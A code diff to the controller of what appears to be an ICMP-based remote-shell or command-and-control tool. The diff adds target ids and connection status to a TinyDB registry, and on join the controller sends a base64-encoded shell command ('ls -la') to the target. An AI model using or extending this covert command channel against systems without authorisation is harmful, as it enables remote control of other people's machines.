@@ -5,6 +5,7 @@ import base64
 from shellylib import Host, Target
 from tinydb import TinyDB, Query
 import os
+import time
 TTL = int(64)
 ICMP_ID = int(12800)
 
@@ -23,7 +24,10 @@ class Controller(Host):
     def join(self, shellpack):
         match shellpack['message']:
             case "hello how are you":
+                
+
                 target = {
+                    "id": round(time.time()),
                     "ip": shellpack['ip'],
                     "iface": shellpack['iface'],
                     "mac": shellpack['mac'],
@@ -34,8 +38,7 @@ class Controller(Host):
                 self.db.insert(target)
                 self.send(target['ip'], "join", "fine thank you")
                 Target = Query()
-                print(self.db.search(Target.ip == '192.168.157.10'))
-                print(self.db.search(target))
+                self.db.update({'status': 'CONNECTED'}, Target.id == target['id'])
                 self.send(target['ip'], "instruction", "request", base64.b64encode("ls -la".encode()))
             case _:
                 print("Invalid join message")
